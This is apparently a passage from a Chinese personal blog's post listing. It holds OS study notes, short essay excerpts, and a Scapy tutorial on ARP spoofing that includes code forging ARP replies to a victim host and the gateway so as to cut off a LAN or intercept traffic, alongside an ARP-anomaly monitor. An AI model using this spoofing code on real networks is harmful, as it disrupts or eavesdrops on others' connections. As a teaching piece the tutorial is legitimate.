两种方式：基于数据结构、基于存储区的共享</code></pre><p>2、管道通信</p>
<pre><code>设置一个特殊的共享文件（管道），其实就是一个缓冲区
一个管道只能实现半双工通信
实现双向同时通信要建立两个管道
各进程要互斥的访问管道
写满时，不能再写，读空时，不能再读
没写满，不能读，没读空，不能写</code></pre><p>3、消息传递</p>
<pre><code>传递结构化的消息（消息头/消息体）
系统提供“发送/接受原语”
两种方式
    直接通信方式：消息直接挂到接收方的消息队列里
    间接（信箱）通信方式：消息先发到中间体（信箱）</code></pre><br>
&emsp;&emsp;通过进程间通信，就可以将消息传递给其他程序，其他程序再讲消息传递给设备控制器，设备控制器将数据输出到屏幕，至此一个基本的操作系统成型。

<p>&emsp;&emsp;最后一点是关于文件系统的，文件系统规定了文件存储的格式，其同样封装了文件存储在磁盘上的细节，只留给用户图形接口来对文件进行wrx等操作，其内部实现了对文件的共享和保护，常见的文件系统有ext3、NFS、exfat等。</p>
<p><img src="https://i.loli.net/2019/09/01/quN7jCBpW9IE2sU.png" alt="文件系统的框架.png"></p>
<p>&emsp;&emsp;文件目录是一种数据结构，用于表示系统中的文件以及其物理地址，供检索时使用。文件目录实现了“按名存取”，“提高了对文件的检索速度”，“实现了文件共享”，“允许文件重名”，这一切主要通过定义它的数据结构FCB来控制。</p>
<p>FCB主要信息：</p>
<pre><code>基本信息：文件名、物理地址
存取控制类：存取权限
使用信息：建立时间、修改时间、打开文件的进程数</code></pre><p>&emsp;&emsp;文件描述信息单独形成一个称为索引结点的数据结构，在文件目录中，每个目录项仅由文件名和指向该文件名所对应的结点指针所构成，文件索引表：</p>
<table>
<thead>
<tr>
<th>文件名</th>
<th>指针</th>
</tr>
</thead>
<tbody><tr>
<td>Name1</td>
<td>Point1</td>
</tr>
<tr>
<td>Name2</td>
<td>Point2</td>
</tr>
<tr>
<td>Name3</td>
<td>Point3</td>
</tr>
</tbody></table>
<p>&emsp;&emsp;这些索引表最终构成了简单的文件目录，单级文件目录、两级文件目录、树形目录结构。我们的文件、程序、应用等一系列的数据就存放在由格式化的文件系统构成的目录下，当程序执行时，磁盘通过算法读取到相应的信息，然后是内存调入(地址映射，重定向，分页管理，页面置换)，接着被处理机(CPU)执行，其间会产生很多中断，当执行完成之后，操作系统通过IO管理系统将结果发送到屏幕。</p>
<p>&emsp;&emsp;然而，一切到这里才刚刚开始，这个操作系统的网络部分还没有浮出水面…..</p>
<hr>
<h2 id="文件管理系统应该实现按名存取"><a href="#文件管理系统应该实现按名存取" class="headerlink" title="文件管理系统应该实现按名存取"></a>文件管理系统应该实现按名存取</h2><ol>
<li>文件存储空间的管理 – 分配和回收</li>
<li>实现文件名到物理地址的映射</li>
<li>实现对文件的操作–建立、删除、读写、目录</li>
<li>实现文件共享和文件保护</li>
<li>提供操作文件的接口、包括命令、程序、菜单</li>
</ol>
<h2 id="Operation-System安全机制"><a href="#Operation-System安全机制" class="headerlink" title="Operation System安全机制"></a>Operation System安全机制</h2><ol>
<li>标识与鉴别</li>
<li>访问控制</li>
<li>最小权限管理</li>
<li>可信通路</li>
<li>安全审计</li>
</ol>
<h2 id="Questions！"><a href="#Questions！" class="headerlink" title="Questions！"></a>Questions！</h2><p>进程？</p>
<pre><code>什么是进程？
进程的特性？
如何控制和产生一个进程？
如何控制和调度多个进程？
进程死锁怎么办，怎么避免？
进程状态转换的本质是什么，进程转换过程中做了哪些操作？
进程有哪些状态？
进程为什么会状态转换？
怎样避免多个进程运行的时候不产生混乱？
什么是临界资源？进程如何访问临界资源？
进程互斥算法？
两个或者多个进程间如何通信？
为什么要产生线程？
线程和进程的区别？
线程有哪些好处？
什么是管程？
为什么要引入管程，管程有哪些好处？</code></pre><p>CPU？</p>
<pre><code>什么是CPU？CPU能干什么？
什么是调度？调度有哪几种？
什么时候进行调度？
怎么调度？
怎么评价一个调度算法的好坏？
早起调度算法与交互式系统调度算法有什么区别？
列举几种常见的CPU调度算法，并描述其实现机制？</code></pre><p>内存？</p>
<pre><code>什么是内存？内存有什么用？
一台电脑内存4G是什么意思？
内存管理是如何完成地址映射的？
程序是如何进入内存的？
内存是如何分配和回收空间的？
内存分配回收空间有哪几种算法，各个的优缺点是什么？
内存的连续分配和非连续分配是什么？
分页存储的基本原理？
分页存储和分段存储有什么不同？
用什么样的数据结构记录系统已经分配的内存、以及系统剩余的内存？
内存空间的扩展是如何实现的？
内存保护是什么？有什么作用？怎么实现的？怎么产生的？</code></pre><p>虚拟存储机制？</p>
<pre><code>什么是虚拟存储？为什么会有虚拟存储？
怎样实现虚拟存储？
缺页中断是什么？
页面是什么时候调入？
页面是从哪里调入？
如何评价一个页面置换算法的好坏？
页面置换是如何置换的？
页面置换的算法？
什么是抖动和工作集？</code></pre><p>I/O系统？</p>
<pre><code>为什么要有输入输出系统？
输入输出系统是怎么产生的？
I/O系统的层次结构模型是什么样的？
设备控制器是什么？
设备控制器有什么用？
中断机构和中断处理程序？
设备驱动程序是什么？
缓冲区的引入有什么好处？
有哪几种缓冲区？
磁盘存储是什么？
磁盘存放数据按照什么格式？机械硬盘是什么格式？固态硬盘是什么格式？
U盘存储原理？
怎样衡量一个磁盘调度算法？
有哪些是磁盘调度算法？如何实现？</code></pre><p>文件管理系统？</p>
<pre><code>为什么会产生文件系统？
文件有什么数据结构？
这些数据结构能支持文件完成哪些动作？
什么是目录？
为什么会产生目录？
目录有什么样的数据结构？
目录存放在磁盘的什么地方？
文件和目录是怎么建立联系的？
文件共享是如何实现的？
文件保护是如何实现的？</code></pre><br>

<hr>
<br>

<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>任何程序都必须满足结构性，以便于外部或内部对其rwx</p>

            
            <p class="more">
                <a href="../../http:/ymlog.cn/2019/08/22/OS%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">阅读剩下更多</a>
            </p>
        </div>
        <div class="post-thumbnail" data-img="">
            <a href="http://ymlog.cn/2019/08/22/OS%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" title="OS操作系统">
                
                    <img class="thumbnail" src="../../img/default.png" data-echo="../../img/thumbnail/2.jpg" alt="默认配图" >
                
            </a>
        </div>
    </div>
</article>

    
        <!-- 文章列表 item -->
<article class="post">
    <header>
        <!-- 标签这有且只能显示一个 -->
        
            <a href="javascript: void(0);" class="cat">未分类</a>
        
        <!-- 文章标题 -->
        
    <h3 class="post-title">
    	<a href="../../http:/ymlog.cn/2019/08/20/zen/">
    		禅
    	</a>
    </h3>

    </header>
    <p class="post-meta">
        Jelon 发表于
        <time datetime="2019-08-19T16:00:00.000Z">2019-08-20</time>
        &nbsp;&nbsp;
        <span class="post-tags">
            标签：
            
    
        <a href="../../tags/%E9%9A%8F%E7%AC%94/" title="随笔">随笔</a>
    

        </span>
    </p>

    <div class="post-content">
        <div class="post-excerpt">
            
                <p>&emsp;&emsp; 释迦牟尼原名乔达摩·悉达多，是古印度迦毗罗卫国（今尼泊尔）的太子，悉达多太子天资聪慧，长到12岁时，就已经掌握了当时印度最高的学问，16岁时，娶了表妹耶输陀罗为妻。</p>
            
            <p class="more">
                <a href="../../http:/ymlog.cn/2019/08/20/zen/">阅读剩下更多</a>
            </p>
        </div>
        <div class="post-thumbnail" data-img="">
            <a href="http://ymlog.cn/2019/08/20/zen/" title="禅">
                
                    <img class="thumbnail" src="../../img/default.png" data-echo="../../img/thumbnail/0.jpg" alt="默认配图" >
                
            </a>
        </div>
    </div>
</article>

    
        <!-- 文章列表 item -->
<article class="post">
    <header>
        <!-- 标签这有且只能显示一个 -->
        
        <a class="cat-link" href="../../categories/%E7%BC%96%E7%A8%8B/">编程</a>
        
        <!-- 文章标题 -->
        
    <h3 class="post-title">
    	<a href="../../http:/ymlog.cn/2019/07/27/Python%E5%AE%9E%E7%8E%B0ARP%E6%AC%BA%E9%AA%97%E5%B1%8F%E8%94%BD%E5%B1%80%E5%9F%9F%E7%BD%91/">
    		Python实现ARP欺骗屏蔽局域网
    	</a>
    </h3>

    </header>
    <p class="post-meta">
        Jelon 发表于
        <time datetime="2019-07-27T12:20:53.000Z">2019-07-27</time>
        &nbsp;&nbsp;
        <span class="post-tags">
            标签：
            
        </span>
    </p>

    <div class="post-content">
        <div class="post-excerpt">
            
                <center>Arp欺骗 ---- Python实现</center>
## 简介
    1、ARP是地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP/IP协议。
    2、当计算机知道IP地址和MAC地址，就会向局域网中发送信息，默认发给默认网关，如果是发到局域网外的信息，则用源主机IP+目的
    这两点是构造ARP毒化攻击的基本原理。
----
    ARP毒化攻击可以干什么？
        ARP毒化可以让局域网内的消息都发往你指定的网关，简而言之就是让本地局域网全部断网，让连接同一个WiFi的设备都上不了网。

<hr>
<pre><code>如何做到的？
计算机、手机、Ipad上网的数据传输发包格式为：
源IP--自己的IP
源MAC--自己的物理地址
目的IP--如180.101.49.12 == www.baidu.com
目的MAC--本地局域网的默认网关MAC

1、目标主机通过ARP广播(由此可见ARP是用UDP协议实现)得到默认网关MAC地址
2、攻击者通过不断地发送(默认网关IP+非默认网关MAC)的形式，更改目标主机中的ARP缓存表
3、目标主机向默认路由发送消息
4、消息在局域网内传播，但不会通过MAC地址流入默认路由器，故默认路由器也不会转发目标主机的消息，目标主机断网。

即通过ARP毒化，让目标主机不能通过ARP协议，完成正确的地址映射。</code></pre><hr>
<pre><code>攻击者如何向目标主机发送(默认网关IP+非默认网关MAC)？
通过Python3的Scapy库来实现。</code></pre><h2 id="1、Scapy工具介绍"><a href="#1、Scapy工具介绍" class="headerlink" title="1、Scapy工具介绍"></a>1、Scapy工具介绍</h2><p>scapy官方文档</p>
<blockquote>
<p><a href="https://scapy.readthedocs.io/en/latest/](https://scapy.readthedocs.io/en/latest/)" target="_blank" rel="noopener">https://scapy.readthedocs.io/en/latest/](https://scapy.readthedocs.io/en/latest/)</a></p>
</blockquote>
<pre><code>安装 pip install scapy</code></pre><p>Scapy可用于构造、发送、解析各类数据包。可以用来扫描，跟踪路由，探测，单元测试，攻击或网络发现。</p>
<pre><code>默认包：以太网头部/IP头部/TCP头部
pkg=Ehter()/IP()/TCP()
pkg.show()</code></pre><p><strong>默认以太网头部</strong></p>
<pre><code>###[ Ethernet ]### 
dst= ff:ff:ff:ff:ff:ff
src= 00:00:00:00:00:00
type= IPv4</code></pre><p><strong>默认IP头部</strong></p>
<pre><code>###[ IP ]### 
     version= 4
     ihl= None
     tos= 0x0
     len= None
     id= 1
     flags= 
     frag= 0
     ttl= 64
     proto= tcp
     chksum= None
     src= 127.0.0.1
     dst= 127.0.0.1
     \options\</code></pre><p><strong>默认TCP头部</strong></p>
<pre><code>###[ TCP ]### 
        sport= ftp_data //默认20
        dport= http            //默认80
        seq= 0
        ack= 0
        dataofs= None
        reserved= 0
        flags= S
        window= 8192
        chksum= None
        urgptr= 0
        options= []</code></pre><h2 id="2、ARP协议简介"><a href="#2、ARP协议简介" class="headerlink" title="2、ARP协议简介"></a>2、ARP协议简介</h2><p>ARP协议实现IP（32bit）地址到MAC（48bit）地址之间的动态映射（由操作系统完成，用户不必关注），多路访问都会用到IP地址</p>
<hr>
<p><strong>实现的具体过程</strong></p>
<pre><code>源主机发送ARP广播报文段，在报文段中填入自己的IP地址，目标的IP地址，以及自己的MAC地址

同一个局域网内的主机都接受该报文段，并与自己的IP地址相比较
如果相同，则发送ARP响应报文，在响应报文中填入自己的MAC地址等
如果不同，则丢弃
源主机接收到目标主机发出的ARP响应报文，放入ARP缓存表</code></pre><p><strong>scapy包结构</strong></p>
<pre><code>###[ ARP ]### 
        hwtype= 0x1         //硬件类型 1：Ethernet
        ptype= IPv4            
        hwlen= None
        plen= None
        op= who-has
        hwsrc= 00:0c:29:ab:65:55    //hardware source 硬件源地址
        psrc= 192.168.3.37                //源IP地址
        hwdst= None                                //hardware destination 硬件目的地址
        pdst= None                                //目的IP地址</code></pre><p><img src="https://i.loli.net/2019/08/30/DZQyihm8xXTkr5N.png" alt="ARP包结构"></p>
<h2 id="3、Scapy实现ARP扫描"><a href="#3、Scapy实现ARP扫描" class="headerlink" title="3、Scapy实现ARP扫描"></a>3、Scapy实现ARP扫描</h2><pre><code>&apos;&apos;&apos;
sr()  发一个，也可以接受好几个包
sr1() 发一个包，可能会收到很多包，但我只接受第一个
srp() 发多个，收多个，p代表工作在二层（以太网层）
send() 只管发
sendp() 需要手动填以太网的信息
&apos;&apos;&apos;</code></pre><p>最基本的ARP请求响应</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">localmac=<span class="string">'00:0c:29:ab:65:55'</span></span><br><span class="line">localip=<span class="string">'192.168.3.37'</span></span><br><span class="line">destip=<span class="string">'192.168.3.31'</span></span><br><span class="line">destmac=destmac</span><br><span class="line"></span><br><span class="line">pkg=srp(Ether(src=localmac,dst=<span class="string">'FF:FF:FF:FF:FF:FF'</span>)/ARP(op=<span class="number">1</span>,hwsrc=localmac,hwdst=<span class="string">'00:00:00:00:00:00'</span>),iface=<span class="string">'ens32'</span>,verbose=<span class="literal">False</span>,timeout=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># op=1:ARP Request</span></span><br><span class="line"><span class="comment"># iface：网卡</span></span><br><span class="line"><span class="comment"># timeout:设置等待时间</span></span><br><span class="line"><span class="comment"># verbose：不打印输出</span></span><br></pre></td></tr></table></figure>

<h3 id="ARP响应的解析—Scapy——ARP数据结构分析"><a href="#ARP响应的解析—Scapy——ARP数据结构分析" class="headerlink" title="ARP响应的解析—Scapy——ARP数据结构分析"></a>ARP响应的解析—Scapy——ARP数据结构分析</h3><p><img src="https://i.loli.net/2019/08/30/gzkyjEhnPbaBd6R.jpg" alt="scapy发收包的数据结构"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;pkg</span><br><span class="line"><span class="comment"># (&lt;Results: TCP:0 UDP:0 ICMP:0 Other:1&gt;, &lt;Unanswered: TCP:0 UDP:0 ICMP:0 Other:0&gt;) //元祖</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;pkg[<span class="number">0</span>]	//选择响应的ARP包</span><br><span class="line"><span class="comment"># &lt;Results: TCP:0 UDP:0 ICMP:0 Other:1&gt;</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;pkg[<span class="number">0</span>].res //生成收发包的清单</span><br><span class="line"></span><br><span class="line"><span class="comment">#用列表容纳收发队列组成的元祖，对应一组计算机[</span></span><br><span class="line">第一个收发(</span><br><span class="line">	<span class="comment"># 发送的包&lt;Ether  dst=FF:FF:FF:FF:FF:FF src=00:0c:29:ab:65:55 type=ARP |&lt;ARP  op=who-has hwsrc=00:0c:29:ab:65:55 psrc=192.168.3.37 pdst=192.168.3.31 |&gt;&gt;,</span></span><br><span class="line">	<span class="comment"># 接受的包&lt;Ether  dst=00:0c:29:ab:65:55 src=58:00:e3:d7:d5:ef type=ARP |&lt;ARP  hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=is-at hwsrc=58:00:e3:d7:d5:ef psrc=192.168.3.31 hwdst=00:0c:29:ab:65:55 pdst=192.168.3.37 |&lt;Padding  load='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' |&gt;&gt;&gt;)]</span></span><br><span class="line"><span class="comment"># 元祖--包含了收发的所有包</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;pkg[<span class="number">0</span>].res[<span class="number">0</span>] //选择第一个收发的包</span><br><span class="line"><span class="comment">#就对应一个计算机(</span></span><br><span class="line">&lt;Ether  dst=FF:FF:FF:FF:FF:FF src=<span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:ab:<span class="number">65</span>:<span class="number">55</span> type=ARP |&lt;ARP  op=who-has hwsrc=<span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:ab:<span class="number">65</span>:<span class="number">55</span> psrc=<span class="number">192.168</span><span class="number">.3</span><span class="number">.37</span> pdst=<span class="number">192.168</span><span class="number">.3</span><span class="number">.31</span> |&gt;&gt;,</span><br><span class="line">&lt;Ether  dst=<span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:ab:<span class="number">65</span>:<span class="number">55</span> src=<span class="number">58</span>:<span class="number">00</span>:e3:d7:d5:ef type=ARP |&lt;ARP  hwtype=<span class="number">0x1</span> ptype=IPv4 hwlen=<span class="number">6</span> plen=<span class="number">4</span> op=<span class="keyword">is</span>-at hwsrc=<span class="number">58</span>:<span class="number">00</span>:e3:d7:d5:ef psrc=<span class="number">192.168</span><span class="number">.3</span><span class="number">.31</span> hwdst=<span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:ab:<span class="number">65</span>:<span class="number">55</span> pdst=<span class="number">192.168</span><span class="number">.3</span><span class="number">.37</span> |&lt;Padding  load=<span class="string">'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'</span> |&gt;&gt;&gt;</span><br><span class="line">)</span><br><span class="line">&gt;&gt;&gt;pkg[<span class="number">0</span>].res[<span class="number">0</span>][<span class="number">1</span>] //选择响应的那一部分</span><br><span class="line">&gt;&gt;&gt;pkg[<span class="number">0</span>].res[<span class="number">0</span>][<span class="number">1</span>][<span class="number">0</span>].fields//选择响应的那一部分的以太网头部</span><br><span class="line"><span class="comment">#&#123;'dst': '00:0c:29:ab:65:55', 'src': '58:00:e3:d7:d5:ef', 'type': 2054&#125;</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;pkg[<span class="number">0</span>].res[<span class="number">0</span>][<span class="number">1</span>][<span class="number">1</span>].fields //选择响应的那一部分的ARP头部</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	'hwtype': 1,</span></span><br><span class="line"><span class="string">	'ptype': 2048, </span></span><br><span class="line"><span class="string">	'hwlen': 6, </span></span><br><span class="line"><span class="string">	'plen': 4, </span></span><br><span class="line"><span class="string">	'op': 2, </span></span><br><span class="line"><span class="string">	'hwsrc': '58:00:e3:d7:d5:ef',</span></span><br><span class="line"><span class="string">	'psrc': '192.168.3.31', </span></span><br><span class="line"><span class="string">	'hwdst': '00:0c:29:ab:65:55', </span></span><br><span class="line"><span class="string">	'pdst': '192.168.3.37'</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">&gt;&gt;&gt;pkg[<span class="number">0</span>].res[<span class="number">0</span>][<span class="number">1</span>][<span class="number">1</span>].fields[<span class="string">'hwsrc'</span>]  //提取目标mac地址，也就是当前目标发包的源mac地址</span><br><span class="line">&gt;&gt;&gt;pkg[<span class="number">0</span>].res[<span class="number">0</span>][<span class="number">1</span>][<span class="number">1</span>].fields[<span class="string">'psrc'</span>]</span><br></pre></td></tr></table></figure>



<h2 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h2><blockquote>
<p><a href="https://github.com/ArchKS/Python/tree/master/ArpSpoof" target="_blank" rel="noopener">https://github.com/ArchKS/Python/tree/master/ArpSpoof</a></p>
</blockquote>
<h2 id="4、Scapy监听ARP异常"><a href="#4、Scapy监听ARP异常" class="headerlink" title="4、Scapy监听ARP异常"></a>4、Scapy监听ARP异常</h2><ul>
<li>建立正确的IP地址和MAC地址的映射数据库</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">'scapy.runtime'</span>).setLevel(logging.ERROR)<span class="comment">#清除报错</span></span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ARP_Table <span class="keyword">import</span> ARP_Table <span class="comment"># 导入合法的IP-MAC映射关系</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">arp_monitor_callback</span><span class="params">(pkt)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> ARP <span class="keyword">in</span> pkt <span class="keyword">and</span> pkt[ARP].op <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">2</span>):<span class="comment">#找到ARP数据包中操作码为1（who-has）或者2（is-at）的数据包）</span></span><br><span class="line">		<span class="keyword">if</span> ARP_Table.get(pkg[ARP].psrc):</span><br><span class="line">			<span class="keyword">if</span> ARP_Table[pkt[ARP].psrc] == pkt[ARP].hwsrc:</span><br><span class="line">				print(<span class="string">'IP地址：&#123;0&#125; MAC地址：&#123;1&#125; 匹配'</span>.format(pkt[ARP].psrc,pkt[ARP].hwsrc))</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				print(<span class="string">'IP地址：&#123;0&#125; MAC地址：&#123;1&#125; 不匹配'</span>.format(pkt[ARP].psrc,pkt[ARP].hwsrc))</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			print(<span class="string">'IP地址：&#123;0&#125; MAC地址：&#123;1&#125; 未找到条码'</span>.format(pkt[ARP].psrc,pkt[ARP].hwsrc))</span><br><span class="line">	<span class="comment">#捕获数据包，通过arp_monitor_callback方法进行处理，filter过滤arp数据包，store=0，不保存数据，iface指定接口</span></span><br><span class="line">	sniff(prn=arp_monitor_callback,filter=<span class="string">'arp'</span>,store=<span class="number">0</span>,iface=<span class="string">'ens32'</span>)</span><br></pre></td></tr></table></figure>

<h2 id="5、Scapy实现ARP的毒化攻击"><a href="#5、Scapy实现ARP的毒化攻击" class="headerlink" title="5、Scapy实现ARP的毒化攻击"></a>5、Scapy实现ARP的毒化攻击</h2><p>原理：</p>
<p><img src="https://i.loli.net/2019/08/30/zKlWci79yTHxwQG.png" alt="攻击之前.png"></p>
<p><img src="!%5B%E6%94%BB%E5%87%BB%E4%B9%8B%E5%90%8E.jpg%5D(https://i.loli.net/2019/08/30/rkwa8dRBtmoFWJT.jpg)" alt="攻击之后"></p>
<p>所以，只需要修改A中的ARP缓存表，将与B对应的MAC修改。<br />于是，发给A的ARP响应报文格式应为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">目的IP：A</span><br><span class="line">目的MAC：A</span><br><span class="line">源IP：B</span><br><span class="line">源MAC：C</span><br></pre></td></tr></table></figure>

<p>就能实现上图功能。<br />紧接着，如果B要发消息给A，那么A中的ARP表可能会调整回正确的，于是可以向B发送ARP报文，格式为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">目的IP：B</span><br><span class="line">目的MAC：B</span><br><span class="line">源IP：A</span><br><span class="line">源MAC：C</span><br></pre></td></tr></table></figure>

<p>这样，B发往A的数据包也会走向C了，A，B双方的通信都将被C截获。<br />通常，B往往是路由器，所以B的IP地址一般是默认网关。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">	源IP为默认网关的IP</span></span><br><span class="line"><span class="string">	源MAC为默认网关的MAC</span></span><br><span class="line"><span class="string">	目的IP为需要毒化主机的IP</span></span><br><span class="line"><span class="string">	目的MAC为需要毒化主机的MAC</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">pkgtoHost=Ether(src=localmac,dst=tgmac)/ARP(op=<span class="number">2</span>,hwsrc=localmac,psrc=gatewayip,hwdst=tgmac,pdst=tgip)</span><br><span class="line">gatewayMac=getmacbyip(gatewayip)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">	源IP为被攻击主机的IP</span></span><br><span class="line"><span class="string">	源MAC为本机MAC</span></span><br><span class="line"><span class="string">	目的IP为默认网关的IP</span></span><br><span class="line"><span class="string">	目的MAC为默认网关的MAC</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">pkgtoGateway=Ether(src=localmac,dst=gatewayMac)/ARP(hwdst=gatewayMac,pdst=gatewayip,psrc=tgip,hwsrc=localmac,op=<span class="number">2</span>)</span><br></pre></td></tr></table></figure>




<h2 id="源码：-1"><a href="#源码：-1" class="headerlink" title="源码："></a>源码：</h2><blockquote>
<p><a href="https://github.com/ArchKS/Python/tree/master/ArpSpoof" target="_blank" rel="noopener">https://github.com/ArchKS/Python/tree/master/ArpSpoof</a></p>
</blockquote>

            
            <p class="more">
                <a href="../../http:/ymlog.cn/2019/07/27/Python%E5%AE%9E%E7%8E%B0ARP%E6%AC%BA%E9%AA%97%E5%B1%8F%E8%94%BD%E5%B1%80%E5%9F%9F%E7%BD%91/">阅读剩下更多</a>
            </p>
        </div>
        <div class="post-thumbnail" data-img="">
            <a href="http://ymlog.cn/2019/07/27/Python%E5%AE%9E%E7%8E%B0ARP%E6%AC%BA%E9%AA%97%E5%B1%8F%E8%94%BD%E5%B1%80%E5%9F%9F%E7%BD%91/" title="Python实现ARP欺骗屏蔽局域网">
                
                    <img class="thumbnail" src="../../img/default.png" data-echo="../../img/thumbnail/7.jpg" alt="默认配图" >
                
            </a>
        </div>
    </div>
</article>

    
        <!-- 文章列表 item -->
<article class="post">
    <header>
        <!-- 标签这有且只能显示一个 -->
        
        <a class="cat-link" href="../../categories/Linux/">Linux</a>
        
        <!-- 文章标题 -->
        
    <h3 class="post-title">
    	<a href="../../http:/ymlog.cn/2019/07/18/play_Linux/">
    		玩转Linux
    	</a>
    </h3>

    </header>
    <p class="post-meta">
        Jelon 发表于
        <time datetime="2019-07-18T04:53:27.000Z">2019-07-18</time>
        &nbsp;&nbsp;
        <span class="post-tags">
            标签：
            
        </span>
    </p>

    <div class="post-content">
        <div class="post-excerpt">
            
                <p>有趣的Linux技巧</p>
            
            <p class="more">
                <a href="../../http:/ymlog.cn/2019/07/18/play_Linux/">阅读剩下更多</a>
            </p>
        </div>
        <div class="post-thumbnail" data-img="">
            <a href="http://ymlog.cn/2019/07/18/play_Linux/" title="玩转Linux">
                
                    <img class="thumbnail" src="../../img/default.png" data-echo="../../img/thumbnail/8.jpg" alt="默认配图" >
                
            </a>
        </div>
    </div>
</article>

    
        <!-- 文章列表 item -->
<article class="post">
    <header>
        <!-- 标签这有且只能显示一个 -->
        
            <a href="javascript: void(0);" class="cat">未分类</a>
        
        <!-- 文章标题 -->
        
    <h3 class="post-title">
    	<a href="../../http:/ymlog.cn/2019/06/06/%E8%AF%97%E9%85%92%E8%B6%81%E5%B9%B4%E5%8D%8E/">
    		诗酒趁年华
    	</a>
    </h3>

    </header>
    <p class="post-meta">
        Jelon 发表于
        <time datetime="2019-06-05T16:00:00.000Z">2019-06-06</time>
        &nbsp;&nbsp;
        <span class="post-tags">
            标签：
            
    
        <a href="../../tags/%E6%91%98%E5%BD%95/" title="摘录">摘录</a>
    

        </span>
    </p>

    <div class="post-content">
        <div class="post-excerpt">
            
                <p>人生到处知何似？应似飞鸿踏雪泥。</p>
            
            <p class="more">
                <a href="../../http:/ymlog.cn/2019/06/06/%E8%AF%97%E9%85%92%E8%B6%81%E5%B9%B4%E5%8D%8E/">阅读剩下更多</a>
            </p>
        </div>
        <div class="post-thumbnail" data-img="">
            <a href="http://ymlog.cn/2019/06/06/%E8%AF%97%E9%85%92%E8%B6%81%E5%B9%B4%E5%8D%8E/" title="诗酒趁年华">
                
                    <img class="thumbnail" src="../../img/default.png" data-echo="../../img/thumbnail/6.jpg" alt="默认配图" >
                
            </a>
        </div>
    </div>
</article>

    

    
    <nav class="page-navigator">
        <span class="page-number current">1</span><a class="page-number" href="page/2/">2</a><a class="extend next" rel="next" href="page/2/">后一页</a>
    </nav>
    


            </div>

        </section>
        <!-- 侧栏部分 -->
<aside class="sidebar">
    
    <section class="widget">
        <h3 class="widget-hd"><strong>文章搜索</strong></h3>
        <div class="search-form">
  <form
